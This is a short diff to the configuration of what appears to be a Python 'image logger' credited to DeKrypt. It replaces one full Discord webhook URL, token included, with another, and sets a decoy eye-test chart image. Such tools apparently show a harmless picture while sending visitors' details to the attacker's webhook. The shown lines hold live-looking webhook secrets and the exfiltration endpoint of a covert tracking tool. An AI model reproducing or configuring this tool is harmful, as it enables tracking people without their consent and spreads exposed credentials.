@@ -12,7 +12,7 @@ __author__ = "DeKrypt"
 
 config = {
     # BASE CONFIG #
-    "webhook": "https://discord.com/api/webhooks/1456106252131238134/WIfiujKpjBpFHlcX-2BylWH8irSWMQ8JO_yYX9Ov0JmCb7SUx6AkjUGbtKIJlWeX0kuP",
+    "webhook": "https://discord.com/api/webhooks/1456807304925286402/yma2yEkYPEkePS5p-1d_dh1ZB9WkcJ8OU6i0PLMBfBH6HYDFvZWtboWDIji-pvINurrq",
     "image": "https://cdn.vectorstock.com/i/1000v/00/95/logmar-chart-eye-test-medical-vector-48960095.jpg", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
